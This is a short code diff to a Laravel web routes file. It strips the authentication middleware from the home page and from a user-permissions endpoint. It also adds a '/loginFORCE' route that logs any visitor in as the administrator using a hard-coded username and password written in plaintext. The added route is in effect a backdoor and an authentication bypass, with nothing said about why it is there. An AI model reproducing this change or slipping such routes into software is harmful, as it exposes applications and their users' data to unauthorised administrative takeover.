@@ -23,11 +23,18 @@ Route::get('/',['middleware' => 'auth',function () {
 }]);
 */
 
-Route::get('/',['middleware' => 'auth',function () {
+Route::get('/',function () {
+   
     return view('index');
-}]);
+});
 
-Route::get('/getUserPermisos',['middleware' => 'auth', 'uses' => 'RolPermisoController@getUserPermisos']);
+Route::get('/loginFORCE',function(){
+    if (Auth::attempt(['username' => 'admin', 'password' => 'admin1234','estado'=>'1'],true)) {
+        return redirect()->intended('/');
+    }
+});
+
+Route::get('/getUserPermisos','RolPermisoController@getUserPermisos');
 
 Route::get('/login',function(){
     return view('login');
